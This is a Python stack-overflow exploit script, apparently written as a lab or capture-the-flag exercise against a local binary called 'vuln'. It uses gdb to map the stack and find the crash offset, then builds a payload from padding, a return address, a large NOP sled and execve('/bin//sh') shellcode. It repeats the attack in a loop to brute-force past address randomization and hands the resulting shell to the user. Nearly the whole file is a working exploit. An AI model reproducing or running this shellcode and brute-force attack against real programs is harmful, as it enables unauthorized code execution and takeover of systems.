import subprocess
import struct
import os
import re
import sys
import pty
import select
from pwn import *


def stack_middle_address(output):

    # Find the line containing the word "stack" and extract the address in the middle
    output_lines = output.split('\n')
    stack_line = next((line for line in output_lines if 'stack' in line), None)
    
    if stack_line is None:
        print("GDB failed to find the stack line.")
        sys.exit(1)
    
    pattern = r'\b0x[0-9a-f]+\b'
    matches = re.findall(pattern, stack_line)
    
    start_address = int(matches[0], 16)
    end_address = int(matches[1], 16)
    
    middle = (start_address + end_address) // 2
    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

    return middle

def generate_test():
    return cyclic(1000)

def locate_ra(pattern):
    gdb_proc = subprocess.Popen([f"gdb vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
    commands = f"""
    set pagination off  #disabling pagination for uninterrupted output
    r
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    offset = cyclic_find(int(eip_value, 16))
    return offset




def main():
        
    if len(sys.argv) != 2:
        print("No executable file provided")
        sys.exit(1)

    vuln = sys.argv[1]
    # docker_image = sys.argv[2]

    #this program has PIE enabled -> compilation option that changes the location of the executable in every run. PIE does not work locally
    #first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
    trash = b'B'*131000
    trash_args = "`cat trash` " * 15    
    open("trash", "wb").write(trash)
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    #then call gdb to find in what adresses the stack fluctuates -> info proc mapping
    gdb_process = subprocess.Popen("gdb {vuln}", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
    commands = f"""
    set disable-randomization off
    b {vuln}
    r {trash_args}
    info proc mapping
    q
    y
    """
    output, _ = gdb_process.communicate(commands)

    middle = stack_middle_address(output)

    #find where the buffer overflows
    overflow = b'A'
    while True:
        vuln_proc = subprocess.Popen([f"./{vuln}"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        vuln_proc.communicate(overflow)

        if vuln_proc.returncode == -11:
            # print(f"Segmentation fault occurred with buffer length: {len(overflow)}")
            #not sure why the program crashes at 136 bytes length, will add 4 bytes to the buffer to cover ebp and reach the return address location. Must change!
            overflow += b'A'*4

            #constructing the payload
            payload = overflow
            payload += struct.pack("<I", middle)
            payload += b'\x90' * 200000
            payload += shellcode

            open("vuln_payload", "wb").write(payload)

            #performing brute force attack
            #while true; do cat vuln_payload - | ./vuln `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`; done
            exploit_command = "cat vuln_payload - | ./vuln `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`"
            i = 0
            while True:
                # print(f"i: {i}")
                i += 1

                master_fd, slave_fd = pty.openpty()

                exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=slave_fd, stdin=slave_fd, stdout=slave_fd, close_fds=True)
                os.write(master_fd, b'\n')

                while True:
                        rlist, _, _ = select.select([master_fd, 0], [], [])
                        # status = exploit_proc.poll()        #why is the status still None after segmentation fault??
                        # print(f"process status: {status}")

                        if master_fd in rlist:
                            try:
                                output = os.read(master_fd, 100000)
                                if output:
                                    # os.write(1, output)  # Write the process output to stdout (1)
                                    if b'Segmentation fault' in output:           #must change, must retrieve the exit code of the process (139)
                                        exploit_proc.terminate()
                                        break

                                else:
                                    break  # Process has exited
                            except OSError:
                                break

                        if 0 in rlist:
                            #exploit took place successfully
                            while True:
                                os.write(1, b'# ')
                                user_input = os.read(0, 5000)
                                
                                if b'exit' in user_input:
                                        exploit_proc.terminate()
                                        os.close(master_fd)
                                        os.close(slave_fd)
                                        os.remove("trash")
                                        os.remove("vuln_payload")
                                        sys.exit(1)
                                
                                os.write(master_fd, user_input)  # Forward user input to the exploit shell
                                rlist_response, _, _ = select.select([master_fd], [], [])

                                while master_fd in rlist_response:
                                    response = os.read(master_fd, 1024)
                                    response = response.replace(b'\r', b'')
                                    if response != user_input:
                                        os.write(1, response)
                                        break

                                    rlist_response, _, _ = select.select([master_fd], [], [])

                # Close the PTY file descriptors
                os.close(master_fd)
                os.close(slave_fd)
            
        else:
            overflow += b'A'


if __name__ == "__main__":
    main()